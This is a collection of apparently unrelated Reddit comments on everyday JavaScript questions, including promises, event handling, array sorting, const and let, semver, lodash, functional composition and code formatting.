Don't like the mixing of VAR and let together in the examples. Use of const when possible would have been better.
It is often desirable to reference the element on which the event handler was fired, such as when using a generic handler for a set of similar elements. When attaching a handler function to an element using addEventListener(), the value of this inside the handler is a reference to the element. If you need access to the event trigger object the first argument passed into the event function would contain that object. so the onclick would contain a mouse related object and the onkeydown the function will include a key event object. Now if you need to do something with these objects it's convenient to use this object other wise you don't need to. 
Gotcha. Can I run this without a server. I.e. as local files?
I don't think you should handle form submit on button click... You should check submit() method and keep type=submit on button. Then you should have return false or event.preventDefault().
Format strings are good for this problem: &gt; require('sprintf')('%02d : %02d . %02d', 1, 2, 3) '01 : 02 . 03' Or strftime strings for times specifically: &gt; require('strftime')('%M : %S', new Date) '39 : 09' It's possible to get fancy: (9-3+1) digits before the (.), 3 digits after: &gt; require('sprintf')('%09.3f', 123.456789) '00123.457' 
great tips
We use a similar architecture in our applications, we use some Python and Node Microservices and the expose them via AWS Gateway. We are still trying to find the 'best approach' or 'best practice' but using the HTTP proxy provided is enough for our requirements.
&gt; you forgot that bitwise operations are only 32 bits I didn't, the links I provide include that. Maybe you should have checked them out, but you are right - which redditor follows a link... &gt; not what I was asking for. You didn't *ask* anything, so I can hardly have missed the "answer" to the non-existing question. I provide links/methods how to work with integers in *current Javascript* in reaction to your note. &gt; about performance? Well so are integers That comment makes no sense - what exactly is slow when you use JS numbers as integers? Especially when they are the only numbers (see two sentences above). All in all a very strange reply, you seem to have an overzealous "I'm being attacked!" chip. Tune it down, please.
I want an integer primitive, why are you acting like (isinteger) is remotely good enough?!? You apparently felt qualified to provide an "answer" to an unasked question.
Changing *selection.baseNode* to *selection.anchorNode* works in Firefox 46.
You should try to follow the main stream frameworks...Angular, Ember, React, etc...they usually retweet (posts, tutorials and conferences) from very seasoned JavaScript developers. You can also search for js blogs and pick devs that explain certain topics or have a writing style that is of your liking.
See my response above. &gt; why are you acting like (isinteger) is remotely good enough?!? And stop making shit up. What I wrote is clearly visible above.
You don't understand the value of integer primitives, yes that is perfectly clear.
See my response above. &gt; You don't understand the value of integer primitives, yes that is perfectly clear. And stop making shit up, you overexcited person. What I wrote is clearly visible above. 
&gt; Isn't threading about performance? Well so are integers Modern JS engines produce JIT code with integer instructions when they can get away with it already. 
Isn't it illegal to reproduce government crests in unofficial capacities...?
Don't address your services using port numbers. You want each service to have it's own **hostname** on DNS. The problem with port numbers is you have to manually keep track of which port number maps to which service, you cannot run multiple instances of the same service using port numbers, and you cannot move services to other machines without manually updating your service addresses.
&gt; i.e. the types are enforced at compile time, but they are lost so the types go unenforced in running programs. Which defeats some of the benefit you get from types. The type system ought to ensure correctness of your code at compile time in order to eliminate (or at least reduce) errors at runtime without costing you anything in performance. Type checking on runtime can be great, as it allows you to catch the errors sooner rather than later, but the performance hit is there. One way of doing it that I've seen was runtime typechecking in development mode, but removing it in production to keep performance smooth, maybe something to consider for Signet?
You can use a reverse proxy with nginx that will map ports to hostname and/or endpoint prefix. So localhost:8080 becomes my service.company.com/api/specificendpoints.
I respect your opinion on this, i'm not a expert on elixir/erlang, but i dont think we should stop trying to take the most (or solve a problem )of a platform just because another tool does this. No one program alone, and in a corporate level theres a lot more going on then just bits, you need to hire, you convince people, and you need to teach new programmers, you want an easy curve between learning and producing code. Node (and javascript) is all over the internet, and other have tried to do microservices on it, and i think they just added a lot of boilerplate. I just want to give another developers an easy ride on this. And also it was born from a necessity in the company i work for. If you found your way through elixir/erlang i couldnt be more happy for you, but others can take a different path then you.
People already have problems with promises and asynchronous rest calls, let alone trying to teach people when it's the best time to use a timeout to offload processing. The benefit to webworkers and multithreading/multiprocess architectures is that they use the standard postMessage library. If you've done anything with postMessage then it should come pretty easily.
"Taking the terrible-lodash approach and breaking each function into its own package does not get rid of or reduce any complexity, but instead moves this complexity onto our tool chain " That is not the point of lodash's breakup into multiple modules. It's constructed that way so if you only need one or two parts of lodash (which is reasonable, it's a utility library after all), you can get just the parts you need without the massive code bloat the the client's browser. Breaking all functionality up for the purposes of putting it back together again with no modification serves no purpose. From the site (https://lodash.com/custom-builds ): "Custom builds make it easy to create lightweight versions of lodash containing only the features you need."
The amount of churn in JS is quite honestly silly. Will be interesting to watch how many people end up finally burning out from rewriting all their shit every 2 months and jump to a saner language/ecosystem
I can't believe you've done this
Aha, that makes sense.
The madman
This is typically used as a classic recursion exercise, but can be achieved using a normal for loop as well. The basic idea is you will be executing the same operation (x + y) a set number of times , with the value of x and y updating after each operation. Pseudocode: x=0 y=1 print x print y loop 10 times { z = x + y x = y y = z print x print y }
?
In computers, there are these things called bits, which are grouped into bytes, words, etc. There is no runtime translation or value checking required from an integer to its binary representation, they are faster, asm.js relies on this fact heavily. floating points have a lot of baggage when used as indexes/counters/pointers/etc. etc. 
This looks nice. And timely too as I'm about to look into VCR-like options for my next project. How does yakbak compare to [node-nock's recording feature](https://github.com/node-nock/nock#recording), [node-replay](https://github.com/assaf/node-replay), and [sepia](https://github.com/linkedin/sepia)? 
The compare function gets called each time a sort decision needs to be made when sorting the values of the array. When sort is trying to figure out which out of 1 and 5 should come first, the compare function is called passing in 1 for a and 5 for b. The result of that call determines the order in the resulting sorted array. If less than 0, put a in front of b, if greater than, b in front of a, and if 0, no change. What gets returned isn't actually stored anywhere. Its just a value that is used in the sort decision making process.
There's very little specific to Javascript in this question - it's an extremely basic introductory programming question. What sort of skill level are you at? What have you been taught so far? What sort of stuff have you been reading that confuses you? One thing to note is that none of the stuff you read online about Javascript frameworks and such will be relevant to this question.
&gt; the compare function is called passing in 1 for a and 5 for b. The result of that call determines the order in the resulting sorted array. I see. So the sort depends on atleast 2 values in the array? Do we need to use the `-` operator then if it's only checking if a or b is greater or less than? I think that's whats throwing me off. Why the subtraction, subtracting of what values? Or when we use the subtraction inside sort, it's not really a subtraction but just a way to tell sort to differentiate between returning values in `ASCENDING` and `DESCENDING` order? 
Disclaimer: I wrote the article @wreckedadvent: I don't define "optimization" to be anything other than "writing (or rewriting) the code in such a way that it runs faster". What I do show in the article is that, for JavaScript, applying certain coding best practices can result in faster code. Consequently, applying these best practices can also be considered an optimization. @Bloompire and @killercup: you are both essentially correct, but the subjects you mention (object construction methods, and minifiers) were simply beyond the scope of my article. Indeed, there are many other JavaScript optimization techniques that I didn't cover. Perhaps you should write about these topics.
Honestly, I would consider myself to below basic in skill. Like this class has been basically teaching us how to use all the Microsoft Office. This thing kinda came out of left field. Like there has been ZERO programming in this class up to this point. 
Can you clarify the license? I assume you're positioning this to be a freemium SaaS tool. I have a lot of experience dealing with large JSON documents and displaying them in tables, usually with www.datatables.net ... one of the most valuable features I found with this library is the render callbacks. It would be nice if your tool supported "templates/views" per column, which is essentially a render callback on the data being displayed. fwiw, I voted for the ability to display nested data.
If you use a var as an int, your js vm will use int math. They use profile data, so basically all such values will be optimized. Downside is there is boxing/unboxing on function calls, but you don't declare types for parameters, so there is bound to be some overhead there, even if js had an int primitive.
Surely, whatever get you work done
Yeah, I agree with that. If the button in your form is your submit button, then specify type as submit. Like /u/paulooze says in this thread, a button `type='submit'` has other built in functionality that works in conjunction with forms. I was just giving an alternative in case he/she wanted a button that wasn't a submit button. Either way, always specify the `type` your button should be, `submit` or `button` (or used less commonly, `reset`).
Haven't thought about monetization at all - freemium SaaS is a great option and I'll likely steer closer to free than premium. Internally the notion of render callbacks exists, I like the idea of exposing that as render plugins. One way would be to customize rendering of objects - like URLs (clickable, previewable), dates, customer ids (into salesforce for previews) etc. Great idea. Thanks for the feedback!
&gt; event.preventDefault() So some HTML elements have built-in events. An example of that would be an anchor tag, `&lt;a href='#'&gt;My link&lt;/a&gt;` or in your case, a `&lt;button type='submit'&gt;Submit&lt;/button&gt;. When you click the anchor tag, your browser will automatically redirect you to what ever is in the `href` attribute. That is the builtin `default` behavior. When you put an `onclick` handler on an element like that, in the `event` parameter in the handler function, you must say, `event.preventDefault()`. That will prevent the browser from performing the default behavior.
Functionally, you're running into a problem because `console.log` returns `undefined`, e.g `()`. Typically, there is no reason to map from some value type `a` to `()`, except when you're trying to indicate a side-effectful value has been applied (such as saving to the database). This is sometimes called `tap`, but more often logging and things like this are done through monads, when done functionally. Easiest solution for you I think would just be to keep the array around. const log = console.log.bind(console); const firstFilter = [1, 2, 3, 4].filter(x =&gt; x % 2 === 0); log(firstFilter); const secondFilter = firstFilter.filter(x =&gt; x !== someOtherThing); log(secondFilter); e: reread what the OP wants to log exactly, modified code a bit to suit.
Really not sure what your fiddle is attempting to do or where you got that code from (it looks like you copied some URL of an active session on amazon and are trying to copy/paste it as a source in your embedding), but looking at the fiddle I see type="application/x-shockwave-flash"; I'd try a flash-related-programming forum, maybe /r/flash? Also, your fiddle has the HTML in the JavaScript portion and a side note: there's no JS in your code. Considering it looks like you're trying to simply embed some random component from Amazon then I'm not surprised you're encountering issues. I would try the flash forum and pose your question along the lines of "Need help with embedding a flash application in HTML" and see what that yields.
Yeah sorry that is what i meant. I tend to use those interchangeably when I shouldn't. But great, thanks a lot.
First off all, kill your nesting: const transaction = queries =&gt; pool.getConnection() .then(conn =&gt; conn.beginTransaction()) .then(conn =&gt; queries(conn)) .then(conn =&gt; conn.commit()) .catch(e =&gt; { conn.rollback() throw e }) .finally(() =&gt; conn.release()) Second of all, throwing the error again isn't *ideal*, but if you want to fail the promise to the consumer, that's about all you can do. 
&gt; First off all, kill your nesting The reason I nested is because there's no reason to rollback if beginTransaction() is the call that fails. I'm not sure what the effects would be if I attempted to do that... I'll need to read the docs. &gt; Second of all, throwing the error again isn't ideal, but if you want to fail the promise to the consumer, that's about all you can do. Arg, that's fine I suppose. I do want to return the error to the caller because these functions are just meant to be thin wrappers around connection acquisition and release. If the query itself fails for some reason, the caller needs to know. So I noticed another problem with this code... `conn` is not available in the finally() call.
Gonna try that, thanks for pointing me in the right direction.
because isLoggedIn() doesnt have a return value, it has callbacks that have return values, but isLoggedIn() doesnt actually return anything, because it is an asynchronous function, and the callbacks return values are irrelevant, because they can not be assigned to anything. You really cant use asynchronous functions as conditions in if statements, that is not how they are meant to be used. in javascript asynchronous functions run code and then do stuff, they dont run code and then return stuff to the caller.
I really wish they had just called it `readonly` or something, because I swear the articles of "`const` isn't immutable!" never ends. As for when to use `const` - use it whenever you want to communicate that the rest of the code that follows was written with the assumption that this value will not be reassigned. I typically use it more often than `let`.
Op, don't get a hang up on writing a single line of code if the best solution is to write two. A one liner may be elegant at time of solving the puzzle but a waste when it comes to time of maintenence. 
Read up on events, what they are and how to use them. 
I agree! Do what you need to do.
["Ah fuck. I can't believe you've done this."](https://www.youtube.com/watch?v=H6VSWCs7d1w) 'tis a meme.
Choosing a technology based on the [perceived] availability of developers has always seemed like a poor choice to me. There are thousands, if not millions, of developers available for almost any platform choice. Choose a technology for its technical merits, not for the simplicity of picking from a pool of people. Being picky and choosing the best developers, rather than any available developer, is smarter anyway.
&gt; The array.length property in fact returns the largest integer property name in the array plus one. I think my arrays are broken var someArray = []; someArray[-10] = 'a'; someArray.length; // 0 var otherArray = []; otherArray[4294967295] = 'b'; otherArray.length; // 0
That's not a problem with semver, it's a problem with people.
Very nice job indeed. This kind of project from "every day needs" are those who really makes me love my job.
If a dev is constantly making breaking changes, then it's a matter of poor development practices and not about the semver specification. The spec is very simple and straightforward. The fact that people have problems with it is what I find most concerning.
I had a problem with Sass compiling on 6.0.0, so I geared back to 5.x. Maybe now that 6.1.x is out, it will work again. 
You could create your own logging function to work with filtering. e.g. function andLog(predicate) { return (x) =&gt; { if (predicate(x)) { console.log(x); return x; } }; } let x = [1,2,3] .filter(andLog(el =&gt; el !== 1)) .filter(andLog(el =&gt; el !== 2)); You could even generalize this further to create functions that produce any side effect, while still returning their value. function andDo(sideEffect) { return (predicate) =&gt; (x) =&gt; { if (predicate(x)) { sideEffect (x); return x; } }; } const andLog = andDo(console.log.bind(console)); let x = [1,2,3] .filter(andLog(el =&gt; el !== 1)) .filter(andLog(el =&gt; el !== 2)); 
If you're sorting a list of two items then you need to ask "should the first item or the second go earlier?" Once you know that, you know the answer. If you're sorting a list of three items then you need to ask "should the first item or the second item go earlier?", "should the second or the third item go earlier?", and (maybe) "should the first or the third item go earlier?" Once you know the answers to those questions, you know the answer. If you're sorting a longer list then the algorithms get more complex, but it still boils down to a series of questions of the form "should [some item] or [some other item] go earlier?" Answer all those questions, and you know the order. Let's call [some item] `a` and [some other item] `b`. If you want to sort numbers in ascending order, then the answer is easy, just say the the smaller one goes first. If you want to sort numbers by the numbers of "3"s in them, then the answer is completely different - you need a different algorithm to decide if `a` or `b` goes first. If you're sorting objects of the form `{id: 0}` by ascending ID, then you need a third algorithm to decide which goes first. It turns out that, no matter what you're sorting or how, the only thing that changes is how you decide if `a` goes before `b`. The native `sort` function needs to know nothing at all about what it's sorting, except how to compare two items and tell which goes first. If it can do that, then it can sort your Array, even if your Array contains data it has no idea how to handle. And that's what the compare parameter is: a function that takes `a` and `b` and returns which goes first. It says (returns) one of three things: "a goes before b", "b goes before a", or "a and b go at the same time". They could have written `sort` to accept those actual strings, but they thought it would be more convenient for us to return some number &gt;0 instead of "a goes before b", some number &lt;0 instead of "b goes before a", or 0 instead of "a and b go at the same time". So, the return value isn't saved anywhere, it isn't itself sorted, it's just used while sorting the original Array to tell which of two items should be placed first in the result.
This might be true in your region but not in mine.. it would be amazing a world where we could do whatever we want, and always keep the most reasonable choices, but thats not like real world works. Imagine that no one tried to implement functional constructs just because lisp/haskell does a better work on this... If the developer is not interested in concept X on language Y, he can just keep using what he is doing, but some people might want it. The choice on my company was based on [real] availability ,budget and technology all three are really important when building software
ahahhah thx now i got it
Those are definitely some good points, thanks for sharing :) Personally, I write my code using ES6. I didn't want to introduce new syntax to the reader because if they're learning about promises (an ES6 feature) then they may/may not know about other ES6 features such as arrow functions, destructuring, etc..
You had me at homomorphism.
Oh, I had just assumed that the promise was resolving to the actual data. Reading it again, the way op's structure resolves is a little odd to me ... But to answer your question, yes, it's recursive. You could perfectly replicate the exact code by doing this: .then(([{ profileData }, { posts }]) But I think the much better and easier-to-read solution would be to adjust the two promises so that their return value is what you are looking for, instead of trying to fish into their structure. e: like this: Promise.all([ fetch("profileData").then(x =&gt; x.json()), fetch("posts").then(x =&gt; x.json()) ]).then(([ profileData, posts ]) =&gt; { // use data })
This is a really good example of the direct computational load, but it gets even worse. Let's say Terrible-Lodash didn't exist, and each thing was made independently by someone else. Without a guiding architect or principal idea, each will develop differently. As such, they will be vastly different APIs, with increased cognitive load (where do I look this function up), increased computational load (ok, if A.a(x) returns an object with named properties and B.b(x) requires an array of tuples, I can't call B.b(A.a(x)) ), and increased refactoring cost (ok, B.b(A.a(x)) should be C.c(A.a(x)) to save memory... but C.c is different!) This argument isn't about lodash. Underscore and Lodash, jQuery and Zepto... so many of the libraries are simply trying to cover for the lack of a strong standard library. They can't fix it; they aren't real standards, just de facto ones. They aren't bundled with the browser. (Happy thought for a second - imagine lodash made deals with browser makers to include a statically defined interface version of lodash pre-bundled in the browser). I feel like a part of the pain is there there is only one real programming language for client side programming (JS), and it just happens to be a language that take a light-standard-library approach, for sometimes better and more often worse.
Where do you see without jquery? I only see a plugin for jquery...
Unfortunately, JavaScript's object-oriented syntax doesn't really allow for that. You could use a library like Ramda or lodash, which provide some utility functions like `compose` and `filter`. Here's an example using Ramda: const f = R.compose( R.filter(el =&gt; el !== 1), R.tap(console.log.bind(console), R.filter(el =&gt; el !== 2) ) const x = f([1,2,3]) *edited to use `R.tap`*
You can use a JSON schema. http://json-schema.org/ There are some validators in the Software tab, and you can google for more
is pipeline not yet being tracked as a proposal? I feel like its been a while since it was first brought up for JS
Ok, gotcha. Well, something to look forward to. And actually, I'm trying to be more functional. I really like the concept, and I think it creates elegant, easy-to-read code, which is why I think I've decided to use lodash. I guess I could try that addFilter thing too. That actually sounds like a good idea.
Perhaps I misspoke; what I meant by comment is that JavaScript doesn't currently have the tools to support an elegant way of chaining and composing operations like in more functional languages. The pipe and bind operator would provide that, absolutely. At the moment, though, all we have is method chaining to give us something that almost looks like it. It's imperfect in exactly this scenario: we want to chain more operations that aren't supported by the standard JS environment, which forces us to modify the prototype or create our own LoggableArray type. Unfortunately, I don't see the bind operator on the [list of proposals](https://github.com/tc39/ecma262), so we may be waiting a long time for such a thing.
The bind operator is sitting in the [stage zero list](https://github.com/tc39/ecma262/blob/master/stage0.md). However! I just talked to the owner of the forward pipe spec, and their impressions was that *neither* are going to move forward at all. So livescript and/or ramda are still your best bet, I guess ...
I saw some functional responses in the other thread. It's bass ackwards from what you're used to, so it can be confusing at first, but useful for situations like this because you're not dependent on the methods of your objects for behavior. Those methods are independently defined as stand alone functions. 
You can use [Array.indexOf](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/indexOf) var i = "0"; var arr = ["0","1","2","3","4","5","6","7","8","9"]; if (arr.indexOf(i) &gt; -1) { console.log("match"); } else { console.log("no match"); } This is also === and not ==. If you want ==, you'll either probably have to do a function that loops through the array to find if it's in there, or convert i to a string first in the example and then do indexOf
Thank you!
Also `Array#some` and `_.some()` in lodash if you need to sift through something more complex like an array of objects or check for a condition instead of a straight value.
I appreciate that OP didn't use much new syntax. It helped me learn promises in terms I already understand. Then I came to comments and read yours... and learned array destructuring! Thanks both of you.
Well the mail I got it in was in my spam box for a reason, I guess...
So, I tried this in my browser class x extends Array { constructor(args) { super(args) } log() { console.log(this) return this } } var p = new x(1,2,3) p.filter(e =&gt; true).log().map(e =&gt; e+1).log() and I still got an error. My chrome is up to date, but I guess they might not have implemented that yet, though
I take it you're on Windows? Seems Chrome Windows is behind Chrome Mac for JS support for some reason. Go here https://kangax.github.io/compat-table/es6/ and look for "well known symbols" in the Built-ins section. Open that up, and check for support in the first column (current browser) for the Symbol.species entries. This is what I get: http://i.imgur.com/LysyHef.png Edit: Conceptually, it could work as a solution, but without babel support, and very limited client support beyond that, its not worth consideration
I was just recently thinking about picking up a chromebook myself. I wasn't sure if it could cut it, but for something small to have around the living room, I don't think I'd be doing much thats not on the web anyway, so it could work out. What kind of code editor do you have for it? Did you look at the support table? Whats your species support on the Chrome OS?
http://www.timeanddate.com/worldclock/
For reddit, please indent your code with 4 spaces so that it's rendered in a monospace font, like this (along how I would format it): var something = new SomeThingConstructor({ ipaddress: '10.10.10.10', username: 'badboy', password: 'OhYeah', partytildawn: true }); something.jumper(function() { something.getit({ action: 'BreakDancing' }); });
This requires `Symbol.species` support, correct?
How do you know the proper way? What are the rules?
I'd prefer not to use minus operator inside a sort function. It really makes it confusing to see what is happening - and won't work for some data types, specifically strings. Subtract a string from a string you wind up with NaN and probably no sort operation. Basically your goal is to return greater than 0, equal or less than 0 -- the engine uses your return values to determine the sort order.
I have a follow up question to the one your asking. Now that you've identified a new library, some new best practices, language updates, etc.. For example, lots of teams are still using ES5 and might be considering adding a transport and ES6 or typescript support. What's the best way to inform your team, distribute the knowledge, and decide if it's something you'd like to pursue as a team? Do you give a short presentation? 
Webpack is more suited for bundling code for web apps, while Rollup works best for JS libraries. Use the right tool for the job.
Huh, someone using a make file to build javascript. See something new every day.
People keep referencing that but it's not really answering my question. They don't seem to talk about when you should move to the next line. 
**It's not the spacing that confuses me. I don't know when to start a new line. I guess after that the spacing is confusing.** For the most part whitespace is ignored (with the exceptions of hardcodings and strings (hence why minification is a thing). Basically just use whatever helps you read better / feels most natural to code with. Personally im a fan of the 80-100em rule. If a line goes beyond 100 characters it's probably worth refactoring.
They all seem to do it consistently though. I think one of them is after a function.
That's part of what style guides are for, but an important rule is that if you put a line break between `return`, `yield`, or `throw` and the value, automatic semicolon insertion will put a semicolon right after that keyword and the return, yield, or throw value will be `undefined`, because they are known as "restricted productions"; similarly, if you mean to use a labelled `break` or `continue`, you need the label on the same line or else it will default to the innermost loop, and the `=&gt;` in an arrow function must be on the same line as its parameter list or it's a syntax error. (Curiously, although `await` looks like an analogue to `yield` for `async` functions, the proposal does not make it a restricted production.) --- Another guide to ensure you don't get tripped up by automatic semicolon insertion is to break up long lines right after operators, because ASI will not add a semicolon right after an operator. Another typical convention is to put a line break after every statement, which basically means every place (other than the header of a `for` loop) where you could put a semicolon, and also put a line break after every function declaration. Yet another one is to put a line break after every opening brace, whether for a code block, a function, or a long object initializer, and also put a line break after the opening bracket of a long array initializer. --- However, it *is* possible to write JS all on one line, and that's one of the many things that minifiers will do for you; you should minify your code before putting it into production, but keep the un-minified version around for development.
Unfortunately because of their name binding semantics they're not as powerful as they could be -- if I want to do something like `string.format(str, **kwargs)` I have to wrap my template string in a IIFE: `function() {return '${this.foo}'}.call({foo: 'bar'})`. This sort of string interpolation is common in (for example) i18n. The consequence of this is that every decently large Javascript project will have a hand-rolled string formatter with slightly different syntax and API.
And they really blew it using `let` as the new variable keyword because in math you use "let" to define constants.
It seems like the sections on [whitespace](https://github.com/airbnb/javascript#whitespace) and [commas](https://github.com/airbnb/javascript#commas) address your questions directly, and the examples throughout the document address them implicitly.
Like i said there are no rules specific to the syntax, it is arbitrary based on what you find easiest to read. People may tend towards certain practices for consistency, there are a great many other languages that do enforce certain rules on syntax. Such languages also closely mimic javascript syntax for example take a look at the php PSR standards (specifically PSR-2). https://github.com/php-fig/fig-standards/tree/master/accepted php has functions (methods) whose syntax is pretty similar to if not exactly the same as javascripts, therefore for consistency (and since javascript doesnt care) adopting it over both languages is not that big of a deal.
I know people are starting a new line after a function. Where do you see that in there? Thanks
I've found when explaining Promises that it can be helpful to demonstrate them with the fetch() API, which is easy to understand, and to do so in a way you'd likely never actually write the code, as counter-intuitive as that sounds... fetch("http://www.cnn.com").then( // fetch() Promise fulfilled. function (inResult) { inResult.text().then( // text() Promise fulfilled function(inText) { console.log(inText); }, // text() Promise rejected. function (inTextError) { console.log("text() error: " + inTextError) } ); }, // fetch() Promise rejected. function (inFetchError) { console.log("fetch() error: " + inFetchError) } ); I've found that developers who know JS otherwise can grok that a bit easier because it looks a lot like what they already know. After that you can get into all the ES6 syntactic sugar with them that, generally, makes it cleaner (though harder to grok in my experience if you're new to that syntax). Besides, it's kind of ironic to me that you can still write what essentially looks like the same callback hell using Promises if you aren't careful :) Good to make them aware of that pitfall early I figure.
https://www.youtube.com/watch?v=4EcVKIGK_dQ
&gt;[**HA GAYYY! [0:04]**](http://youtu.be/4EcVKIGK_dQ) &gt;&gt;ha gayyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy! &gt; [*^RostyTV*](https://www.youtube.com/channel/UC3_51CjKcKcUGWhI1HhpSmg) ^in ^People ^&amp; ^Blogs &gt;*^1,502 ^views ^since ^Oct ^2013* [^bot ^info](http://www.reddit.com/r/youtubefactsbot/wiki/index)
;)
This is wrong. Why would moderator disable such a useful resource? I couldn't find it but I see It still works on the browser.
Is the second file really called `File2.js`? The first file expects it to be `app.js`. Second, it appears that you intended `looping` to be defined within the `Fibonacci` function but you have closed that function too early and so `this` is not what you expect it to be.
Angular 2 with rxjs is ~800kb minified. You would not want to debug a 800kb minified file whenever something goes wrong. The node ecosystem generally has more smaller modules, instead of few larger ones. (although, "angular/upgrade", "angular/router-deprecated", and "angular2-in-memory-web-api" look suspect for a fresh ng2 app)
 if (~['0', '1', '2', '3'].indexOf(i)) foo(bar); // elements omitted for brevity is probably as close as you'll come to your Python implementation if you're constrained to ES5.
lodash 
This is ES5. There's so much time spent casting iife's, glueing them together in specific order. Copy-pasting dependency soup. Dirty-replacing dep-soup with concatenated glue-ball. File changed, adapting the build script. Rinse and repeat. None of the js files make readable sense since they have no visible dependencies, their context is given outside in the [build script](https://github.com/leeoniya/domvm/blob/1.x-dev/build.cmd). With a slightly larger project one burns through so much manual grunt work that coding becomes an afterthought. ES6 means getting a transpiler, setting one up isn't fun. But once that's done the codebase is liberated from ES5 and that's enough of a benefit for me to set up babel + webpack/rollup once and forget about it.
yeah. check out the other thread in this post.
This is sweet! Although it says it's 70% complete do you think it's ready to get full usage? 
Just look for your beauty in the code's presentational style and use what feels right to you. 
I'm using Joi (https://github.com/hapijs/joi) in a work project. It's very powerful, and has a declarative synax. It might be a good fit for complex objects.
Sometimes one wants a skinny task runner and then they delegate the main relevant commands that make directories to "make" itself, it is all about separation of concerns. I don't agree we should be using make for JS though, there is "npm scripts" property for that (although there is no rule for directory dependency) which could easily be used in conjunction with a task runner (gulp, grunt, w/e). It is not that it doesn't make any sense. It has use cases....
Thanks for sharing!
No no no no no. Tools that reformat entire files are horrible for source control. Ever look at a commit where it seems the entire file was deleted and rewritten? Yeah. That's because of source reformatting tools in almost every case.
The code works 100% as the same code is running ReactSpeed.com. The chapter content is in progress and I am open to reader suggestions and requests for more chapters.
Agree.. The JSON Schema might be the best choice . There are a lot of awesome validators, data generators, and even complex ORM solutions.
Haven't tried this myself, but this seems like a possible option https://www.npmjs.com/package/verifier
You start with `f = a + b` where `a = 0` and `b = 1`. Usually these first cases are handled specially.
[removed]
OK. One karma + webpack coming up (smiles). I will give it a try. Enzyme looks cool as well.
I never understood why .text(), .json(), etc. need additional promises. Anyone knows why they made it this way instead of simply returning the result straight away?
Hi /u/jonathanmh, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
&gt; that's enough of a benefit for me to set up babel + webpack/rollup once and forget about it. but yesterday it was commonjs/browserify/grunt? and umd/typescript/jspm? and isn't this the main point? tomorrow you'll have to set up another "combination of the week"..."once". i'm not saying there's no benefit, just that while the churn is still happening you really have to weigh the benefits vs the high probability that this isnt the last time in the next 6 months that it will change.
Done properly, that only happens once when these tools are implemented, and there's a single commit that reformats everything. If you're trying to use it any other way (i.e. only blocks of code at a time), then you're taking a suboptimal approach. There is no inherent problem with using these types of tools in your project; the main pitfall is that they're often imperfect, and so you might end up fighting them on some edge-cases. The Go language includes a formatter, so that all Go code will be formatted consistently, and I think it's a brilliant feature of the language. Nobody can argue the "correct" way to format code, because there is only 1 way any single piece of code can be formatted. From [their webpage](https://golang.org/doc/effective_go.html#formatting): &gt; Formatting issues are the most contentious but the least consequential. People can adapt to different formatting styles but it's better if they don't have to, and less time is devoted to the topic if everyone adheres to the same style. The problem is how to approach this Utopia without a long prescriptive style guide.
Really cool!
[This chapter](https://drboolean.gitbooks.io/mostly-adequate-guide/content/ch8.html) from Mostly Adequate Guide to functional programming I think answers this question excellently. Short answer is, no, you can't bail out of a series of composed functions without try/catch or if/else, but that doesn't mean you have to write this ceremony in every function that might have some null types. Your composed functions can safely pass a Maybe or Either type from one to the next, only doing the work if the contained value meet some criteria (not null, greater than 5, etc..) then you call `composedFunc(obj)._value` to see what you ended up with. The Maybe/Either type you implement can also do some logging for you along the way to see how the individual functions are treating your inner value.
What would have been written before the date? 
Weekday?
Not sure if its intentional, but it should be possible to get 360: `((360 - 720) % 360) + 360 === 360 // true` edit: never mind, it has to be `(360 - 720) % 360 + 360 === 0 // true` which checks out.
That's the problem, it seems 
Check out: http://www.listjs.com
Quick question: If `--depth=1` flag makes you clone only the latest commit, how are you getting the entire project?
I'm sure they'll see sense and revise this change at some point, small bundle sizes are obviously important but this is a huge step back for the approachability of the framework. I think they just wanted a headline for ngconf of how small things can be, hopefully usability will be taken in account now it's out of the way.
Haha. Nice. 
What you're looking for is called a monad. Probably a `Maybe` or `Either` type. The basic idea of monads is they are a way to chain together operations. That's it. They have one (relevant) function called `bind`. This function takes some context and a function, and will only call the function if it determines the context is appropriate for it. Here's how you would write, for example, a `NullMonad`: const NullMonad = {} NullMonad.bind = f =&gt; ctx =&gt; ctx != null ? f(ctx) : ctx Really simple stuff, right? Nothing scary here at all. Then you would use like this: let bind = NullMonad.bind _.compose(bind(doSomething), bind(bootstrapKey), bind(verifyRequiredKeys)) You could expand the checks in `bind` to check for whatever else you desire, such as the properties on `ctx` to be of non-null type. You'll notice that the `bind` function on `NullMonad` is curried. When we call it with our function, we get back *another* function which is expecting our current context. If `ctx` isn't `null`, we return the result of evaluating the function we passed to it earlier with the context. If it is `null`, then we just return our context. This will actually avoid calling the function *entirely* if the context is `null`. Let me know if you have any questions! e: technically monads need a bit *more* than just this, you need the stay within the "type". They wrap things, like promises. However, this should be enough for your use case. When you're comfortable enough with this, /u/azium 's [link](https://drboolean.gitbooks.io/mostly-adequate-guide/content/ch8.html) is a good place to start for more "complete" monads that properly "wrap" things. By this point, you'd probably just want to use `Maybe` instead of rolling your own.
Awesome this is a great start. I am keen to do browser testing as well. Goes in line with the speed coding philosophy. Will checkout the links you have shared.
Try Math.pow() instead of ^
Yeah, I actually hadn't written any unit tests _ever_ until a few weeks ago. I initially got mocha-loader set up, which does live-watching and displays test results in a separate browser page, but then saw the mention of mocha-webpack and wanted to give that a shot. When I then tried to write my first "real" unit tests, mocha-webpack allowed me to iterate _very_ quickly on each test.
 if(snakeY+(snakeHeight/2) &lt; 0) { snakeY = canvas.height-snakeHeight; 
 if(snakeY+(snakeHeight/2) &lt; 0) { snakeY = canvas.height - (snakeHeight/2); } else if(snakeY+(snakeHeight/2) &gt; canvas.height) { snakeY = 0 - (snakeHeight/2); } if(snakeX+(snakeWidth/2) &lt; 0) { snakeX = canvas.width - (snakeWidth/2); } else if(snakeX+(snakeWidth/2) &gt; canvas.width) { snakeX = 0 - (snakeWidth/2); }
Thanks :)
Check out MDN's post about Array.some, essentially works the same way as in. If an instance of true is resolved, the function will return true. Similar to contains.
Maybe geonames.org
The other issue is that `Math.log` is the *natural* logarithm, so the answer is a little over 110.
Isn't Log of 0 undefined? Or does log(0) mean something else?
